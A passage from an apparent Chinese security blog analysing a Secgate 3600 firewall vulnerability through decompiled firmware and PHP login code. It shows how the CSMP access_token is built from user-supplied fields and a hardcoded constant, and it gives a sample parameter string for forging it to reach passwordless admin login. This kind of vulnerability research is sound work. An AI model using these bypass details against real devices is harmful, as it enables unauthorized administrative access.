+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">FUN_00410fb0</span><span class="params">(undefined8 param_1,undefined8 param_2,<span class="type">long</span> param_3,undefined8 param_4)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  <span class="type">char</span> **in_FS_OFFSET;</span><br><span class="line">  </span><br><span class="line">  pcVar1 = in_FS_OFFSET[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">if</span> (((__sg_dbg_state != (<span class="type">int</span> *)<span class="number">0x0</span>) &amp;&amp; (*__sg_dbg_state != <span class="number">0</span>)) &amp;&amp;</span><br><span class="line">     (*(<span class="type">char</span> *)(__sg_dbg_state + <span class="number">0xa86</span>) != <span class="string">&#x27;\0&#x27;</span>)) &#123;</span><br><span class="line">    __s = *in_FS_OFFSET;</span><br><span class="line">    <span class="built_in">snprintf</span>(__s,<span class="number">0x2800</span>,<span class="string">&quot;*** func[%s], str[%s] ***\n&quot;</span>,<span class="string">&quot;admin_process_csmp_check_sign&quot;</span>,param_1);</span><br><span class="line">    <span class="built_in">sg_dbg_write</span>(<span class="number">0</span>,<span class="number">0x54</span>,<span class="number">0</span>,__s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (param_3 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (pcVar1 == in_FS_OFFSET[<span class="number">5</span>]) &#123;</span><br><span class="line">    uVar2 = <span class="built_in">FUN_00412e30</span>(param_3,param_4,param_1);<span class="comment">//处理数据</span></span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>继续跟进<code>FUN_00412e30</code>,在这个函数中对数据进行处理，数据格式是下面这个样子。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Timestamp=1743977367#X-Authorization=Token#username=username#role_id=role_id#lms_ip=ipaddr#lms_port=port#client_id=client_id#uuid=uuid#</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/FUN_00412e30.jpg"
+                      alt="img"
+                ></p>
+<p><code>FUN_00412e30</code>函数，简单说就是使用<code>strstr</code>和<code>strchr</code>去提取数据，并使用<code>snprintf</code>拼接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/sha1.jpg"
+                      alt="img"
+                ></p>
+<p>然后生成<code>access_token</code>并且写入lms_sso_last_csmp_token文件，的作用我们一会就会知道。</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>((<span class="type">char</span> *)local_1a48,<span class="number">0x1ff</span>,<span class="string">&quot;%s%ld&quot;</span>,</span><br><span class="line">          PTR_s_5678471853609579508_0061dcf8,tVar5);</span><br><span class="line">puVar22 = local_848;</span><br><span class="line"><span class="keyword">for</span> (lVar10 = <span class="number">0x100</span>; lVar10 != <span class="number">0</span>; lVar10 = lVar10 + <span class="number">-1</span>) &#123;</span><br><span class="line">  *puVar22 = <span class="number">0</span>;</span><br><span class="line">  puVar22 = puVar22 + (ulong)bVar25 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">snprintf</span>((<span class="type">char</span> *)local_848,<span class="number">0x7ff</span>,</span><br><span class="line">          <span class="string">&quot;echo lms_sso_last_csmp_token_src=%s &gt; /tmp/lms_sso_last_csmp_token&quot;</span></span><br><span class="line">          ,local_1a48);</span><br><span class="line"><span class="built_in">system</span>((<span class="type">char</span> *)local_848);</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="built_in">SHA1</span>((uchar *)local_1a48,</span><br><span class="line">      (<span class="type">long</span>)puVar19 +</span><br><span class="line">      ((<span class="number">-3</span> - (ulong)<span class="built_in">CARRY1</span>((byte)uVar4,(byte)uVar4)) -</span><br><span class="line">      (<span class="type">long</span>)local_1a48),(uchar *)&amp;local_2048);</span><br><span class="line">puVar16 = &amp;local_1fb8;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  bVar17 = *(byte *)puVar22;</span><br><span class="line">  puVar22 = (undefined8 *)((<span class="type">long</span>)puVar22 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>((<span class="type">char</span> *)puVar16,<span class="string">&quot;%02x&quot;</span>,(ulong)bVar17);</span><br><span class="line">  uVar26 = (undefined4)((ulong)client_id &gt;&gt; <span class="number">0x20</span>);</span><br><span class="line">  puVar16 = (undefined8 *)((<span class="type">long</span>)puVar16 + <span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (puVar22 != &amp;local_2034);</span><br><span class="line">client_id = local_848;</span><br><span class="line"><span class="keyword">for</span> (lVar10 = <span class="number">0x100</span>; lVar10 != <span class="number">0</span>; lVar10 = lVar10 + <span class="number">-1</span>) &#123;</span><br><span class="line">  *client_id = <span class="number">0</span>;</span><br><span class="line">  client_id = client_id + (ulong)bVar25 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">snprintf</span>((<span class="type">char</span> *)local_848,<span class="number">0x7ff</span>,</span><br><span class="line">          <span class="string">&quot;echo lms_sso_last_csmp_token_str=%s &gt;&gt; /tmp/lms_sso_last_csmp_token&quot;</span></span><br><span class="line">          ,&amp;local_1fb8);</span><br><span class="line"><span class="built_in">system</span>((<span class="type">char</span> *)local_848);</span><br></pre></td></tr></table></figure></div>
+<p>那么这个获取<code>access_token</code>的逻辑就是,对用户提供的数据进行拼接组成一个新的字符串,使用sha1函数生成哈希值,并且对比用户提供的<code>X-Authorization</code>值</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;lms_ip=127.0.0.1&amp;lms_port=80&amp;client_id=123&amp;uuid=45617439773675678471853609579508</span><br><span class="line"><span class="comment">#这里主要来说一下uuid，45617439773675678471853609579508, 前三位是我们传的uuid的456,然后是我们的时间戳10位,至于5678471853609579508伪代码中是一个固定的数字字符串</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后是login函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/login.jpg"
+                      alt="img"
+                ></p>
+<p>先看看是如何初化数据的吧</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;current_vsys_name&#x27;</span> =&gt; <span class="string">&#x27;root-vsys&#x27;</span>, <span class="comment">// 当前vsys</span></span><br><span class="line">    <span class="string">&#x27;target_vsys_name&#x27;</span> =&gt; <span class="string">&#x27;root-vsys&#x27;</span>, <span class="comment">// 目标 vays</span></span><br><span class="line">    <span class="string">&#x27;from&#x27;</span> =&gt; <span class="string">&#x27;webui&#x27;</span>, <span class="comment">//来源</span></span><br><span class="line">    <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>, <span class="comment">//用户名</span></span><br><span class="line">    <span class="string">&#x27;language&#x27;</span> =&gt; <span class="string">&#x27;CN&#x27;</span>, <span class="comment">//语言</span></span><br><span class="line">    <span class="string">&#x27;sessionid&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>, <span class="comment">//默认为 0 初次登录没生成设备session</span></span><br><span class="line">    <span class="string">&#x27;function&#x27;</span> =&gt; <span class="string">&#x27;admin_login&#x27;</span>, <span class="comment">//默认为登录模块方法</span></span><br><span class="line">    <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>, <span class="comment">//默认为登录模块名称</span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="number">1</span>, <span class="comment">//登录方式 默认webui登录  1-webui，2-smac，3-csmp，4-）</span></span><br><span class="line">    <span class="string">&#x27;is_admin_priv&#x27;</span> =&gt; <span class="literal">true</span>, <span class="comment">// 登录成功是否取权限列表 默认取权限</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$comment</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$response_list</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造方法，用于构造用户实例 生成 命令</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $config 用户配置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $comment_config 命令配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$comment_config</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 获取用户配置 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;config, <span class="variable">$config</span>);<span class="comment">//合并数组</span></span><br><span class="line">    <span class="comment">/* 默认下发命令配置 */</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;comment = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;admin_auth&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;addr&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_client_ipaddr</span>(),</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSSL</span>(),</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;haddr&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>],</span><br><span class="line">        ),</span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;comment[<span class="string">&#x27;admin_auth&#x27;</span>] = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;comment[<span class="string">&#x27;admin_auth&#x27;</span>], <span class="variable">$comment_config</span>);<span class="comment">//合并数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>跟进入<code>$User-&gt;login();</code>函数<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/logincalss.jpg"
+                      alt="img"
+                ></p>
+<p><code>create_command</code>函数转换为json数据</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">create_command</span>(<span class="params"><span class="variable">$command</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;config);</span><br><span class="line">    <span class="comment">//Log::write($command[&#x27;admin_auth&#x27;][&#x27;password&#x27;]);</span></span><br><span class="line">    <span class="variable">$command_data</span> = <span class="title function_ invoke__">ngfw_json_encode</span>(<span class="variable">$command</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//Log::write($command_data);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$command</span>)) &#123;</span><br><span class="line">        <span class="variable">$command_data</span> = <span class="title function_ invoke__">ngfw_json_encode</span>(<span class="variable">$this</span>-&gt;comment, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$login_command</span> = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&#123;&quot;request_list&quot;:&#123;&quot;head&quot;:&#123;&quot;current_vsys_name&quot;:&quot;<span class="subst">&#123;$current_vsys_name&#125;</span>&quot;,&quot;target_vsys_name&quot;:&quot;<span class="subst">&#123;$target_vsys_name&#125;</span>&quot;,&quot;from&quot;:&quot;<span class="subst">&#123;$from&#125;</span>&quot;,&quot;user&quot;:&quot;<span class="subst">&#123;$user&#125;</span>&quot;,&quot;language&quot;:&quot;<span class="subst">&#123;$language&#125;</span>&quot;,&quot;sessionid&quot;:<span class="subst">&#123;$sessionid&#125;</span>&#125;,&quot;body&quot;:&#123;&quot;request&quot;:[&#123;&quot;head&quot;:&#123;&quot;function&quot;:&quot;<span class="subst">&#123;$function&#125;</span>&quot;,&quot;module&quot;:&quot;<span class="subst">&#123;$module&#125;</span>&quot;&#125;,&quot;body&quot;:<span class="subst">&#123;$command_data&#125;</span>&#125;]&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$login_command</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>最后转换后的json数据应该是下面这个样子的</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;request_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;head&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;current_vsys_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root-vsys&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;target_vsys_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;root-vsys&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webui&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CN&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sessionid&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;head&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;function&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin_login&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;admin_auth&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;addr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.199.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HTTPS&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">80</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;haddr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*username&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Csmp&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;access_token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*token&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;lms_ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;lms_port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;client_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;uuid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后调用<code>Normal_login</code>函数处理登录</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Normal_login</span>(<span class="params"><span class="variable">$login_command</span>, <span class="variable">$type</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">        <span class="comment">//正常登录 Csmp 登录</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">php_call_admin</span>(<span class="variable">$login_command</span>);<span class="comment">//这里的过滤和CsmpConfig一样</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//smac 登录</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="comment">//Log::write(&#x27;php_smac_call_admin&#x27;);</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">php_smac_call_admin</span>(<span class="variable">$login_command</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到和前面一样调用的是<code>php_call_admin</code>函数，让我们回到这个函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/php_call_admin_1.jpg"
+                      alt="img"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/php_call_admin_2.jpg"
+                      alt="img"
+                ></p>
+<p>当我们满足access_token等于文件中保存的token,和name不为空时, 调用<code>sg_admin_auth_user_csmp_no_password</code>函数,我们跟进这个函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/sg_admin_auth_user_csmp_no_password.jpg"
+                      alt="img"
+                ></p>
+<p>继续跟进<code>sg_admin_auth_user_ex_csmp_no_password</code>函数<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/sg_admin_auth_user_ex_csmp_no_password.jpg"
+                      alt="img"
+                ></p>
+<p>同样将数据进行了转发,我们找到对应的处理函数<code>FUN_00404630</code>(需要跟很多函数所以我们直接来看关键点，FUN_004100c0-&gt;FUN_0040f1b0-&gt;FUN_00404ff0-&gt;FUN_00404630)<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/admin_user_auth_csmp_no_password.jpg"
+                      alt="img"
+                ></p>
+<p>而这里最重要的是<code> auth_param_handle_set_param(local_2050,5,&quot;admindb&quot;,username,password);</code>的设置我们可以在libsg_sc.so中找到</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">auth_param_handle_set_param</span></span></span><br><span class="line"><span class="function">              <span class="params">(auth_param_handle *auth_handle,<span class="type">int</span> auth_type,<span class="type">char</span> *server,<span class="type">char</span> *user,<span class="type">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  <span class="type">size_t</span> sVar4;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ((auth_handle == (auth_param_handle *)<span class="number">0x0</span>) || (server == (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">    iVar2 = <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar2 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (user != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      sVar3 = <span class="built_in">strlen</span>(server);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">0xfb</span> &lt; sVar3) &#123;</span><br><span class="line">        sVar3 = <span class="number">0xfb</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(auth_handle-&gt;authsrv_name,server,sVar3);</span><br><span class="line">      auth_handle-&gt;authsrv_name[sVar3] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      sVar3 = <span class="built_in">strlen</span>(user);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">0xfb</span> &lt; sVar3) &#123;</span><br><span class="line">        sVar3 = <span class="number">0xfb</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(auth_handle-&gt;username,user,sVar3);</span><br><span class="line">      auth_handle-&gt;username[sVar3] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (password != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        sVar4 = <span class="built_in">strlen</span>(password);</span><br><span class="line">        sVar3 = <span class="number">0xfb</span>;</span><br><span class="line">        <span class="keyword">if</span> (sVar4 &lt; <span class="number">0xfc</span>) &#123;</span><br><span class="line">          sVar3 = sVar4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(auth_handle-&gt;password,password,sVar3);</span><br><span class="line">        auth_handle-&gt;password[sVar3] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      auth_handle-&gt;auth_type = auth_type; <span class="comment">//设置auth_type为5</span></span><br><span class="line">      iVar2 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 